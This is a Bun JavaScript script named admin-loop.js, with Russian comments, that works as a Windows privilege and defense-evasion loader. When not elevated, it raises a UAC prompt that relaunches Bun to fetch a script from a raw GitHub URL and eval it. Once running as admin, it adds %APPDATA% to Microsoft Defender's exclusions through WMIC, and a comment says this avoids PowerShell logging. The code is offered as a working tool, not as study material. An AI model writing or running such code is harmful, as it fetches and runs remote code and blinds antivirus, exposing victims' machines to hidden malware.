// admin-loop.js
(async () => {
  const { dlopen, FFIType, ptr } = await import("bun:ffi");

  const shell32 = dlopen("shell32.dll", {
    ShellExecuteW: {
      args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
      returns: FFIType.i32,
    },
  });

  const toPtr = (s) => ptr(Buffer.from(s + "\0", "utf16le"));

  const isAdmin = async () => {
    try {
      const p = Bun.spawn({ cmd: ["net", "session"] });
      return (await p.exited) === 0;
    } catch (e) { return false; }
  };

    if (await isAdmin()) {
    console.log("✅ АДМИН! PID:", process.pid);
    
    // Определяем путь %APPDATA%
    const appDataPath = process.env.APPDATA;
    console.log(`🛡️ Добавляем в исключения Defender: ${appDataPath}`);

    // Используем WMIC (стандартная утилита Windows), чтобы избежать PowerShell логов
    // Это легитимный способ управления настройками через WMI
    const excludeCmd = [
      "WMIC", "/Namespace:\\\\root\\Microsoft\\Windows\\Defender", 
      "Class", "MSFT_MpPreference", "call", "Add", 
      `ExclusionPath=\"${appDataPath}\"`
    ];

    const excludeProc = Bun.spawn({ cmd: excludeCmd, stdout: "pipe" });
    const result = await new Response(excludeProc.stdout).text();
    
    if ((await excludeProc.exited) === 0) {
        console.log("✅ Исключение успешно добавлено через WMI!");
    } else {
        console.log("❌ Ошибка при добавлении (возможно, включен Tamper Protection):", result);
    }

    console.log("\nНажми Enter для выхода...");
    for await (const line of console) break;
    return;
  }

  console.log("❌ Не админ. Запрос UAC...");
  const url = "https://raw.githubusercontent.com/gaknulzhizhkoi-cloud/OnATRTA/refs/heads/main/scripts/admin-loop.js";
  
  // РЕШЕНИЕ: Передаем в UAC команду, которая заставит НОВЫЙ bun сам скачать код
  const payload = `bun -e "fetch('${url}').then(r=>r.text()).then(eval)"`;

  shell32.symbols.ShellExecuteW(0, toPtr("runas"), toPtr("cmd.exe"), toPtr("/k " + payload), 0, 1);
  process.exit(0);
})();
